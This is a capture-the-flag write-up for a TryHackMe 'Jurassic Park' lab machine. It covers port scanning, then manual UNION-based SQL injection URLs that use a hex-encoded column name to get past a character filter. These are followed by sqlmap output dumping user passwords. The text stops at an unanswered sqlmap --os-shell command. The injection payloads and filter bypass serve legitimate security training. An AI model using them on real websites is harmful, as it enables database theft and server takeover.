---
A Jurassic Park CTF
---

# Jurassic Park — Writeup

## Overview
### Jurassic Park — Writeup
### Jurassic Park — Writeup
![](https://tryhackme-images.s3.amazonaws.com/room-icons/9d1b176b68fbab2dcf90877eaf9a866c.jpeg)
### Jurassic Park CTF
Start Machine
![](https://i.imgur.com/QbveEJf.png)
This medium-hard task will require you to enumerate the web application, get credentials to the server and find 5 flags hidden around the file system. Oh, _Dennis_ Nedry has helped us to secure the app too...
You're also going to want to turn up your devices volume (firefox is recommended). So, deploy the VM and get hacking..
Please [connect to our network](https://tryhackme.com/access) before deploying the machine.
Answer the questions below

## Enumeration
```text
┌──(kali㉿kali)-[~/nappy/DX1]
└─$ rustscan -a 10.10.87.126 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.87.126:22
Open 10.10.87.126:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-14 12:33 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:33
Completed NSE at 12:33, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:33
Completed NSE at 12:33, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:33
Completed NSE at 12:33, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 12:33
Completed Parallel DNS resolution of 1 host. at 12:33, 0.01s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:33
Scanning 10.10.87.126 [2 ports]
Discovered open port 80/tcp on 10.10.87.126
Discovered open port 22/tcp on 10.10.87.126
Completed Connect Scan at 12:33, 0.19s elapsed (2 total ports)
Initiating Service scan at 12:33
Scanning 2 services on 10.10.87.126
Completed Service scan at 12:33, 6.49s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.87.126.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:33
Completed NSE at 12:33, 9.96s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:33
Completed NSE at 12:33, 2.40s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:33
Completed NSE at 12:33, 0.00s elapsed
Nmap scan report for 10.10.87.126
Host is up, received user-set (0.19s latency).
Scanned at 2023-01-14 12:33:06 EST for 19s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f362ca366f9a5bdcc41ed269e4c33f0f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/ulPfmLciJKOQwTWqImu8bo1KQ4XU14AbMxwuXucoYnIFVes9C8OIxKdFvyoDQ1whE4xG1UInWS0PDiqJd/uwTk4minkaYwSCJpcw2Jf1cnJPwwpbZNEJjZb+f3VgTKpxoW6XMh59rk4ihG9uMkL8yqMGovDNJNmbm1OZYN2NqPjJ8vkL5cxvZLHNM2vuhqQ5CqduXwS5SQfvcCAIGpB47smeg8oRt8/2zpTA3IUQnqT8tzAanLYxWttUAQexqXgvJDjKhZ7SkdP58o6b+tAlubxAlR27CnWwNL5JbdV/fc15IIeTRr6Q98SNEpwrWgTMa/HsyT0uTlxJXrJSLjrj
|   256 080e6457eae87eba8bbb9325917c04c0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLRESt3pjeeVThKuxVh/YM7F/jt1rnPgIOpbk/XL/SjKhuVFkLbPa1EqvsfxSAv+casNeBN/CxmPGGBBKyWxx+4=
|   256 b6d1daacc7de8035e5949ad4e37745ec (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGpWTsX5q9Q5JPmYbpqLapcTLLrTinz6hgpFvVdNchJb
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 019A6B943FC3AAA6D09FBA3C139A909A
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Jarassic Park
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:33
Completed NSE at 12:33, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:33
Completed NSE at 12:33, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:33
Completed NSE at 12:33, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.24 seconds

view-source:http://10.10.87.126/shop.php

   <a href="/item.php?id=3" class="btn btn-danger">Buy Basic</a>
          </div>
        </div>
      </div>
      <div class="col-sm-4">
        <div class="card" style="width: 18rem;">
          <img class="card-img-top" src="assets/3.jpg" alt="Card image cap">
          <div class="card-body">
            <h5 class="card-title">Bronse</h5>
            <p class="card-text">Tour around park and dinosaur lunch.</p>
            <a href="/item.php?id=2" class="btn btn-danger">Buy Bronse</a>
          </div>
        </div>
      </div>
      <div class="col-sm-4">
        <div class="card" style="width: 18rem;">
          <img class="card-img-top" src="assets/2.jpg" alt="Card image cap">
          <div class="card-body">
            <h5 class="card-title">Gold</h5>
            <p class="card-text">Tour, dinosaur lunch and free dinosaur egg.</p>
            <a href="/item.php?id=1" class="btn btn-danger">Buy Gold</a>

http://10.10.87.126/item.php?id=5

Dennis, why have you blocked these characters: ' # DROP - username @ ---- Is this our WAF now?

http://10.10.87.126/item.php?id=5%20union%20select%201,2,3,4,5

2,4,5 (vulnerables)

http://10.10.87.126/item.php?id=5%20union%20select%201,database(),3,version(),5

or

http://10.10.87.126/item.php?id=5%20union%20select%201,(select+group_concat(schema_name,%22\r\n%22)+from+information_schema.schemata),3,version(),5

park Package , 5 of these packages have been sold in the last hour, 5.7.25-0ubuntu0.16.04.2

information_schema ,mysql ,park ,performance_schema ,sys Package, 5.7.25-0ubuntu0.16.04.2

now retrieve table_name and column_name

http://10.10.87.126/item.php?id=5%20union%20select%201,(select+group_concat(table_name,%22:%22,column_name)+from+information_schema.columns+where+table_schema=database()),3,4,5

items:id,items:package,items:price,items:information,items:sold,users:id,users:username,users:password Package

users:username and password

http://10.10.87.126/item.php?id=5%20union%20select%201,(select+group_concat(username,%22:%22,password)+from+database().users),3,4,5

won't work cz username is blocked

http://10.10.87.126/item.php?id=5%20union%20select%201,(select+group_concat(0x757365726e616d65,%22:%22,password)+from+park.users),3,4,5

username:D0nt3ATM3,username:ih8dinos Package

http://10.10.87.126/item.php?id=5%20union%20select%201,(select+group_concat(password)+from+park.users),3,4,5

D0nt3ATM3,ih8dinos

Dennis: ih8dinos

using sqlmap

https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap
https://hacknopedia.com/2022/07/29/sqlmap-tamper-script-collection/
https://red-orbita.com/?p=7476
https://alomancy.gitbook.io/guides/cheat-sheets/sql-injection/sqlmap
```
```text
┌──(kali㉿kali)-[~/nappy/DX1]
└─$ sqlmap -u 'http://10.10.87.126/item.php?id=5' --dump               
        ___
       __H__                                                                                                                              
 ___ ___[)]_____ ___ ___  {1.6.12#stable}                                                                                                 
|_ -| . [.]     | .'| . |                                                                                                                 
|___|_  [)]_|_|_|__,|  _|                                                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:13:14 /2023-01-14/

[14:13:14] [INFO] resuming back-end DBMS 'mysql' 
[14:13:14] [INFO] testing connection to the target URL
[14:13:29] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=5 AND 2300=2300

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: id=5 AND GTID_SUBSET(CONCAT(0x716b627071,(SELECT (ELT(6652=6652,1))),0x716a786271),6652)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=5 AND (SELECT 4991 FROM (SELECT(SLEEP(5)))hzDI)
---
[14:13:29] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.10 or 16.04 (xenial or yakkety)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.6
[14:13:29] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[14:13:29] [INFO] fetching current database
[14:13:29] [INFO] resumed: 'park'
[14:13:29] [INFO] fetching tables for database: 'park'
[14:13:29] [INFO] resumed: 'items'
[14:13:29] [INFO] resumed: 'users'
[14:13:29] [INFO] fetching columns for table 'users' in database 'park'
[14:13:29] [INFO] resumed: 'id'
[14:13:29] [INFO] resumed: 'int(11) unsigned'
[14:13:29] [INFO] resumed: 'username'
[14:13:29] [INFO] resumed: 'varchar(11)'
[14:13:29] [INFO] resumed: 'password'
[14:13:29] [INFO] resumed: 'varchar(11)'
[14:13:29] [INFO] fetching entries for table 'users' in database 'park'
[14:13:29] [INFO] resumed: '1'
[14:13:29] [INFO] resumed: 'D0nt3ATM3'
[14:13:43] [WARNING] reflective value(s) found and filtering out
[14:13:43] [INFO] resumed: '2'
[14:13:43] [INFO] resumed: 'ih8dinos'
Database: park
Table: users
[2 entries]
+----+-----------+----------+
| id | password  | username |
+----+-----------+----------+
| 1  | D0nt3ATM3 |          |
| 2  | ih8dinos  |          |
+----+-----------+----------+

[14:13:57] [INFO] table 'park.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.87.126/dump/park/users.csv'
[14:13:57] [INFO] fetching columns for table 'items' in database 'park'
[14:13:57] [INFO] resumed: 'id'
[14:13:57] [INFO] resumed: 'int(11) unsigned'
[14:13:57] [INFO] resumed: 'package'
[14:13:57] [INFO] resumed: 'varchar(11)'
[14:13:57] [INFO] resumed: 'price'
[14:13:57] [INFO] resumed: 'int(11)'
[14:13:57] [INFO] resumed: 'information'
[14:13:57] [INFO] resumed: 'char(250)'
[14:13:57] [INFO] resumed: 'sold'
[14:13:57] [INFO] resumed: 'int(11)'
[14:13:57] [INFO] fetching entries for table 'items' in database 'park'
[14:13:57] [INFO] resumed: '1'
[14:13:57] [INFO] resumed: 'Childen under 5 can attend free of charge and will be eaten for free. This package includes a dinosaur lunc...
[14:13:57] [INFO] resumed: 'Gold'
[14:13:57] [INFO] resumed: '500000'
[14:13:57] [INFO] resumed: '4'
[14:13:57] [INFO] resumed: '2'
[14:13:57] [INFO] resumed: 'Children under 5 can attend free of charge and eat free. This package includes a tour around the park and a...
[14:13:57] [INFO] resumed: 'Bronse'
[14:13:57] [INFO] resumed: '250000'
[14:13:57] [INFO] resumed: '11'
[14:13:57] [INFO] resumed: '3'
[14:13:57] [INFO] resumed: 'Children under 5 can attend for free and eat free. This package will include a basic tour around the park i...
[14:13:57] [INFO] resumed: 'Basic'
[14:13:57] [INFO] resumed: '100000'
[14:13:57] [INFO] resumed: '27'
[14:13:57] [INFO] resumed: '5'
[14:13:57] [INFO] resumed: 'Dennis, why have you blocked these characters: ' # DROP - username @ ---- Is this our WAF now?'
[14:13:57] [INFO] resumed: 'Development'
[14:13:57] [INFO] resumed: '0'
[14:13:57] [INFO] resumed: '0'
[14:13:57] [INFO] resumed: '100'
[14:13:57] [INFO] resumed: 'Nope'
[14:13:57] [INFO] resumed: '...'
[14:13:57] [INFO] resumed: '-1'
[14:13:57] [INFO] resumed: '-1'
Database: park
Table: items
[5 entries]
+-----+------+--------+-------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| id  | sold | price  | package     | information                                                                                                                                                                            |
+-----+------+--------+-------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 1   | 4    | 500000 | Gold        | Childen under 5 can attend free of charge and will be eaten for free. This package includes a dinosaur lunch, tour around the park AND a FREE dinosaur egg from a dino of your choice! |
| 2   | 11   | 250000 | Bronse      | Children under 5 can attend free of charge and eat free. This package includes a tour around the park and a dinosaur lunch! Try different dino's and rate the best tasting one!        |
| 3   | 27   | 100000 | Basic       | Children under 5 can attend for free and eat free. This package will include a basic tour around the park in the brand new automated cars!                                             |
| 5   | 0    | 0      | Development | Dennis, why have you blocked these characters: ' # DROP - username @ ---- Is this our WAF now?                                                                                         |
| 100 | -1   | -1     | ...         | Nope                                                                                                                                                                                   |
+-----+------+--------+-------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+

[14:13:57] [INFO] table 'park.items' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.87.126/dump/park/items.csv'
[14:13:57] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.87.126'

[*] ending @ 14:13:57 /2023-01-14/

maybe using --random-agent and --tamper=between will work too
```
```text
┌──(kali㉿kali)-[~/nappy/DX1]
└─$ sqlmap -u 'http://10.10.87.126/item.php?id=5' --os-shell
